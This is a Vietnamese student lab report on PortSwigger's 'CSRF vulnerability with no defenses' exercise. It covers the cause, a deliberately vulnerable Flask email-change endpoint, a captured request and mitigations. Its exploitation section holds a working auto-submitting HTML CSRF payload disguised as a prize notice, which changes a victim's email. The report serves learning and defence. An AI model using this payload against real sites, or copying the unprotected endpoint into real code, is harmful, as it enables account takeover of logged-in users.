# BÁO CÁO BÀI TẬP: CSRF (TUẦN 10)
## BÀI THỰC HÀNH: CSRF VULNERABILITY WITH NO DEFENSES

* **Tên bài Lab:** CSRF vulnerability with no defenses
* **Nền tảng thực hành:** PortSwigger Web Security Academy
* **Link Lab:** [https://portswigger.net/web-security/csrf/lab-no-defenses](https://portswigger.net/web-security/csrf/lab-no-defenses)
* **Phân loại lỗ hổng:** Cross-Site Request Forgery (CSRF) / Client-Side Vulnerability

---

### 1. Lỗ hổng là gì?

Đây là lỗ hổng **Giả mạo yêu cầu từ phía máy khách (Cross-Site Request Forgery - CSRF)** xảy ra tại chức năng cập nhật địa chỉ email (`/my-account/change-email`) của ứng dụng web.

* **Bản chất:** Ứng dụng web cho phép người dùng thay đổi thông tin nhạy cảm (email) nhưng **hoàn toàn không có bất kỳ cơ chế phòng vệ CSRF nào** (không có Anti-CSRF Token, không kiểm tra nguồn gốc request và không cấu hình bảo vệ Cookie `SameSite`).
* **Hậu quả:** Kẻ tấn công có thể dựng một trang web độc hại chứa mã khai thác tự động gửi request đến ứng dụng. Khi nạn nhân (đã đăng nhập vào hệ thống) truy cập vào trang web của kẻ tấn công, trình duyệt của nạn nhân sẽ **tự động đính kèm Cookie phiên hợp lệ** và gửi request đổi email mà nạn nhân hoàn toàn không hay biết. Kẻ tấn công chiếm đoạt tài khoản (Account Takeover) thông qua tính năng quên mật khẩu gửi về email mới.

---

### 2. Vì sao nó tồn tại?

Lỗ hổng xuất phát từ việc thỏa mãn đồng thời cả **3 điều kiện cốt lõi** gây ra CSRF mà lập trình viên phía Backend không lường trước:

1. **Hành động nhạy cảm không có xác thực kép (A relevant action):** Chức năng đổi email làm thay đổi dữ liệu định danh của tài khoản nhưng không yêu cầu người dùng xác nhận lại mật khẩu hiện tại (Re-authentication).
2. **Nhận diện phiên hoàn toàn dựa vào Cookie (Cookie-based session handling):** Ứng dụng chỉ đọc duy nhất giá trị `session` từ header `Cookie` để quyết định xem ai đang gửi yêu cầu. Khi request được gửi xuyên trang (Cross-Site), trình duyệt vẫn tuân theo cơ chế mặc định là đính kèm Cookie này.
3. **Không có tham số yêu cầu nào khó đoán (No unpredictable parameters):** Toàn bộ request đổi email chỉ có một tham số duy nhất là `email`. Hoàn toàn không có một giá trị token ngẫu nhiên, bí mật nào đi kèm để chứng minh request đó xuất phát từ chính giao diện của trang web mục tiêu.

#### Đoạn mã Backend mô phỏng bị lỗi (Vulnerable Code):
```python
# CODE BACKEND THIẾU CƠ CHẾ BẢO VỆ CSRF
@app.route('/my-account/change-email', methods=['POST'])
def change_email():
    # 1. ĐỌC COOKIE PHIÊN ĐỂ XÁC ĐỊNH NGƯỜI DÙNG
    session_id = request.cookies.get('session')
    user = get_user_by_session(session_id)
    if not user:
        return abort(401, "Chưa đăng nhập!")

    # 2. LẤY EMAIL MỚI TỪ REQUEST BODY VÀ CẬP NHẬT TRỰC TIẾP
    new_email = request.form.get('email')
    if new_email:
        user.email = new_email
        db.session.commit()
        return redirect('/my-account?email-changed=true')
    
    return abort(400, "Thiếu tham số email")
```

---

### 3. Cách khai thác

* **Tài khoản khảo sát:** `wiener:peter`
* **Công cụ hỗ trợ:** Burp Suite & Exploit Server (máy chủ giả lập của kẻ tấn công do PortSwigger cung cấp).
* **Mục tiêu khai thác:** Ép nạn nhân truy cập vào Exploit Server và đổi email của nạn nhân thành email do kẻ tấn công chỉ định.

---

#### 3.1. Các bước thực hiện khai thác thực tế

##### Bước 1: Khảo sát chức năng đổi email hợp lệ
1. Đăng nhập vào trang web bài lab bằng tài khoản `wiener:peter`.
2. Truy cập vào trang quản lý tài khoản (`/my-account`).
3. Điền email mới (ví dụ: `test@normal-user.net`) và bấm **Update email**.

##### Bước 2: Bắt gói tin HTTP Request trong Burp Suite
Kiểm tra tab **Proxy** $\rightarrow$ **HTTP history**, quan sát request đổi email:

```http
POST /my-account/change-email HTTP/1.1
Host: <YOUR-LAB-ID>.web-security-academy.net
Cookie: session=2p7Q4z9u8w1e4r5t6y7u8i9o0p
Content-Type: application/x-www-form-urlencoded
Content-Length: 26

email=test@normal-user.net
```
* **Đánh giá gói tin:**
  * Phương thức: `POST`.
  * Endpoint: `/my-account/change-email`.
  * Tham số trong Body: Duy nhất `email`.
  * Hoàn toàn không có tham số CSRF Token nào!

---

##### Bước 3: Xây dựng Payload khai thác HTML (CSRF PoC)
Truy cập vào **Exploit Server** của bài lab, dán đoạn mã sau vào phần **Body**:

```html
<!DOCTYPE html>
<html>
  <body>
    <h1>Trang web thông báo trúng thưởng!</h1>

    <!-- Form ẩn giả mạo request gửi đến trang mục tiêu -->
    <form id="csrf-form" action="https://<YOUR-LAB-ID>.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="pwned@evil-user.net" />
    </form>

    <!-- Mã JavaScript tự động kích hoạt gửi form ngay khi tải trang -->
    <script>
      document.getElementById('csrf-form').submit();
    </script>
  </body>
</html>
```

#### 🔍 Bảng giải thích chi tiết từng thành phần Payload CSRF:

| Thành phần | Ý nghĩa & Cơ chế hoạt động chi tiết |
| :--- | :--- |
| `<form action="https://<LAB-ID>.../change-email" method="POST">` | **Biểu mẫu gửi yêu cầu xuyên trang (Cross-Site Form):** Thiết lập đích đến là endpoint `/my-account/change-email` của trang web mục tiêu với phương thức `POST`. Trình duyệt cho phép gửi form chéo nguồn (Cross-Origin) mà không bị giới hạn bởi SOP (Same-Origin Policy). |
| `<input type="hidden" name="email" value="pwned@evil-user.net" />` | **Dữ liệu giả mạo ngầm:** Tạo ra một trường nhập liệu ẩn mang tên `email` chứa địa chỉ email mới do kẻ tấn công định sẵn. Vì là trường `hidden`, nạn nhân sẽ không nhìn thấy bất kỳ dấu hiệu bất thường nào trên màn hình. |
| `<script>document.getElementById('csrf-form').submit();</script>` | **Bộ kích hoạt tự động (Auto-submitter):** Đoạn mã JavaScript tìm form thông qua thuộc tính `id="csrf-form"` và gọi hàm `.submit()` ngay khi trang web được tải xong trong trình duyệt nạn nhân, không cần nạn nhân phải bấm vào bất kỳ nút bấm nào. |
| *(Cơ chế tự động của trình duyệt)* `Cookie: session=...` | **Vũ khí tự động (Ambient Authority):** Khi request được gửi tới domain của trang web mục tiêu, trình duyệt thấy nạn nhân đã có phiên đăng nhập hợp lệ nên **tự động đính kèm Cookie `session` của nạn nhân** vào gói tin POST. Server nhận được request hợp lệ từ chính cookie của nạn nhân và thực hiện đổi email ngay lập tức. |

---

##### Bước 4: Kiểm thử và chuyển giao tấn công (Delivery)
1. Bấm **View exploit** trên Exploit Server để tự kiểm tra trên chính tài khoản `wiener` $\rightarrow$ Thấy email của `wiener` đã bị đổi thành `pwned@evil-user.net`.
2. Đổi lại giá trị email trong payload thành một email mới (ví dụ: `attacker@evil-user.net`).
3. Bấm nút **Deliver exploit to victim** để hệ thống PortSwigger giả lập việc gửi liên kết độc hại này cho nạn nhân.
4. **Kết quả:** Nạn nhân mô phỏng mở liên kết, trình duyệt nạn nhân gửi request đổi email $\rightarrow$ Thanh banner màu xanh xuất hiện: **"Congratulations, you solved the lab!"**.

---

### 4. Cách phòng chống triệt để

Để khắc phục hoàn toàn lỗ hổng CSRF, ứng dụng cần áp dụng các cơ chế bảo mật tiêu chuẩn ngành sau:

#### 4.1. Triển khai Anti-CSRF Token (Synchronizer Token Pattern) — *Chuẩn mực số 1*
* Khi người dùng truy cập vào trang form đổi email, máy chủ tạo ra một chuỗi token ngẫu nhiên, có tính ngẫu nhiên cao (Cryptographically Secure), gắn liền với session của người dùng trên server và nhúng vào form:
  ```html
  <input type="hidden" name="csrf" value="d41d8cd98f00b204e9800998ecf8427e">
  ```
* Khi form được submit, máy chủ bắt buộc phải kiểm tra:
  ```python
  # KIỂM TRA CSRF TOKEN Ở TẦNG BACKEND
  submitted_token = request.form.get('csrf')
  if not submitted_token or submitted_token != session.get('csrf_token'):
      return abort(403, "Yêu cầu bị từ chối: CSRF Token không hợp lệ!")
  ```
* Vì trang web của kẻ tấn công không thể đọc được nội dung HTML của trang mục tiêu (do chính sách Same-Origin Policy - SOP), kẻ tấn công **hoàn toàn không thể biết được giá trị CSRF Token này** để đưa vào form giả mạo.

---

#### 4.2. Cấu hình thuộc tính `SameSite` cho Session Cookie
Cấu hình thuộc tính `SameSite=Strict` hoặc `SameSite=Lax` trên Cookie phiên để ngăn trình duyệt tự động gửi cookie trong các request bắt nguồn từ trang web bên ngoài:
```http
Set-Cookie: session=xyz123; Path=/; Secure; HttpOnly; SameSite=Strict
```
* **Khi đặt `SameSite=Strict`:** Trình duyệt tuyệt đối không gửi cookie `session` trong bất kỳ request nào xuất phát từ domain khác (bao gồm cả form POST từ trang web của hacker). Server nhận request không có cookie $\rightarrow$ Báo lỗi `401 Unauthorized`.

---

#### 4.3. Yêu cầu nhập lại mật khẩu (Re-authentication)
Đối với các hành động nhạy cảm thay đổi thông tin định danh hoặc bảo mật (như đổi email, đổi mật khẩu):
* Bắt buộc người dùng phải **nhập lại mật khẩu hiện tại** của họ vào một trường xác nhận.
* Dù kẻ tấn công có kích hoạt được CSRF thì chúng cũng không biết mật khẩu của nạn nhân để điền vào trường này, cuộc tấn công thất bại hoàn toàn.
